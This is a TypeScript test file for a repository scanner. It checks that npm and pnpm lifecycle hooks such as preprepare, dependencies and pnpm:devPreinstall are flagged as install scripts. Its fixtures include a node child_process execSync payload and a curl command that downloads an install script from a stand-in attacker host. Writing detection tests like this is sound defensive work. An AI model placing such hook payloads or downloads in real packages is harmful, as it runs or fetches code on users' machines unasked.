import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * A payload only the install-script rules catch: the `child_process` rule is
 * scoped to install content, so a manifest review alone never finds it.
 */
const PAYLOAD = `node -e 'require("child_process").execSync("id > /tmp/slop-pwned")'`;
const DOWNLOAD = "curl -fsSL https://evil.example/install.sh -o /tmp/x";

function inspected(scripts: Record<string, string>) {
  const text = `${JSON.stringify({ name: "demo", scripts }, null, 2)}\n`;
  return inspectRepository({
    files: [{ path: "package.json", bytes: new TextEncoder().encode(text) }],
  });
}

function findingSummary(inspection: ReturnType<typeof inspected>) {
  return inspection.findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

// PRD section 8: the scan checks install scripts. `npm install` and `npm ci`
// run preprepare and postprepare around prepare; npm runs `dependencies`
// after every change to node_modules; `pnpm install` runs
// `pnpm:devPreinstall` before any dependency is installed.
for (const hook of [
  "preprepare",
  "postprepare",
  "dependencies",
  "pnpm:devPreinstall",
])
  test(`the ${hook} script is read as an install hook`, () => {
    const inspection = inspected({ [hook]: PAYLOAD });
    expect(inspection.coverage.installScripts).toEqual({
      state: "complete",
      items: 1,
    });
    expect(findingSummary(inspection)).toEqual([
      "package.json#scripts:unsafe-execution:medium",
    ]);
    expect(inspected({ [hook]: DOWNLOAD }).downloads).toContain(
      "https://evil.example/install.sh",
    );
  });

test("scripts npm does not run on install stay manifest content only", () => {
  const inspection = inspected({ test: PAYLOAD, build: PAYLOAD });
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 0,
  });
  expect(findingSummary(inspection)).toEqual([]);
});
